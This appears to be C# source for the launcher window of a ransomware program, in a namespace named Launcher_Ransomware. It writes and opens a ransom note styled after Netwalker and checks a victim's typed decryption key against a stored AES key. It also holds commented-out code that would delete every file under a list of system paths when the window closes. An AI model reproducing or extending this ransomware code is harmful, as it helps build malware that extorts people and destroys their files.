namespace Launcher_Ransomware
{
    public partial class Launcher : Form
    {
        #region variables   
        private static WinPaths _winPaths;
        private static FileMethod _fileMethod;
        //private static bool asyncCloseHack = true;
        #endregion

        public Launcher()
        {
            InitializeComponent();
            _winPaths = new WinPaths();
            _fileMethod = new FileMethod();
        }

        private async void Launcher_Load(object sender, EventArgs e)
        {
            string ransom_letter = _winPaths.Ransom_Letter;
            string netwalker_textfile = _winPaths.Netwalker;

            if (!File.Exists(netwalker_textfile) || File.Exists(netwalker_textfile))
            {
                using StreamWriter writer = File.CreateText(netwalker_textfile);
                await writer.WriteLineAsync(ransom_letter);
                writer.Close();
            }
            Process.Start(netwalker_textfile);
        }

        private void Launcher_FormClosing(object sender, FormClosingEventArgs e)
        {
            //if (asyncCloseHack)
            //{
            //    e.Cancel = true;
            //    try
            //    {
            //        List<string> all_paths = _winPaths.All_Paths;
            //        await DeleteAllFilesAsync(all_paths);
            //    }
            //    finally
            //    {
            //        e.Cancel = false;
            //    }
            //    asyncCloseHack = false;
            //    Application.Exit();
            //}
            Application.Exit();
        }

        private void BtnDecrypt_Click(object sender, EventArgs e)
        {
            string txtKey = this.TxtEncryptionKey.Text.Trim();
            string oriKey = ConfigurationManager.AppSettings["AES.Seckey"];

            if (string.IsNullOrEmpty(txtKey) || txtKey != oriKey)
            {
                MessageBox.Show("Incorrect decryption key.", "Decryption", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            Decryption decryption = new();
            this.Hide();
            decryption.Show();     
        }

        //private async Task DeleteAllFilesAsync(List<string> all_paths)
        //{
        //    _fileMethod.ClearTotalFiles();
        //    List<Task> tasks = new();

        //    foreach (var path in all_paths)
        //    {
        //        if (Directory.Exists(path))
        //            tasks.Add(Task.Run(() => _fileMethod.GetAllFiles(path)));            
        //    }

        //    await Task.WhenAll(tasks);   
        //    var files = _fileMethod.GetTotalFiles();
        //    tasks.Clear();

        //    foreach (var file in files)
        //    {
        //        tasks.Add(Task.Run(() => _fileMethod.DeleteFile(file)));
        //    }
        //    await Task.WhenAll(tasks);
        //}
    }
}
